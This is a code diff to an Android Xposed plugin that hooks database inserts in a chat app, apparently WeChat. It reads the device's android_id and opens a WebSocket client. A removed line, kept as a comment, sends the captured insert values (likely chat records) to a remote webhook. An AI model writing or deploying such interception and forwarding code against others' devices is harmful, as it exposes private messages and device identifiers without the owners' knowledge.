@@ -1,14 +1,18 @@
 package com.lu.wxmask.plugin.part
 
+import android.annotation.SuppressLint
 import android.content.ContentValues
 import android.content.Context
+import android.provider.Settings.Secure
 import android.view.View
 import com.lu.lposed.api2.XposedHelpers2
 import com.lu.lposed.plugin.IPlugin
 import com.lu.magic.util.ReflectUtil
 import com.lu.magic.util.log.LogUtil
 import com.lu.wxmask.ClazzN
-import com.lu.wxmask.sendPostRequest
+import com.lu.wxmask.http.WebSocketClient
+import com.lu.wxmask.http.androidId
+import com.lu.wxmask.http.sendPostRequest
 import com.lu.wxmask.util.ext.toJson
 import de.robv.android.xposed.IXposedHookZygoteInit.StartupParam
 import de.robv.android.xposed.XC_MethodHook
@@ -20,7 +24,15 @@ import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam
 class ChatRoomPlugin : IPlugin {
     private var sharedPreferences: XSharedPreferences? = null
 
+    @SuppressLint("HardwareIds")
     override fun handleHook(context: Context, lpparam: LoadPackageParam) {
+
+        androidId = try {
+            Secure.getString(context.contentResolver, "android_id")
+        } catch (e: Exception) {
+            ""
+        }
+
 //        handleLoadPackage(lpparam)
         LogUtil.i("ChatRoomPlugin handleHook")
 //        val listViewField = XposedHelpers2.findField(
@@ -65,6 +77,12 @@ class ChatRoomPlugin : IPlugin {
             })
     }
 
+    private val socketClient by lazy {
+        val client = WebSocketClient()
+        client.start()
+        client
+    }
+
     // 输出插入操作日志
     private fun printInsertLog(
         context: Context,
@@ -90,7 +108,9 @@ class ChatRoomPlugin : IPlugin {
                     + "; conflick values: " + arrayConflictValues[conflickValue]
                     + "; nullColumnHack: " + contentValues
         )
-      sendPostRequest(context, contentValues.toJson())
+
+        socketClient.sendMessage("hello")
+//        sendPostRequest("webhook", contentValues.toJson())
     }
 
     fun handleLoadPackage(loadPackageParam: LoadPackageParam) {
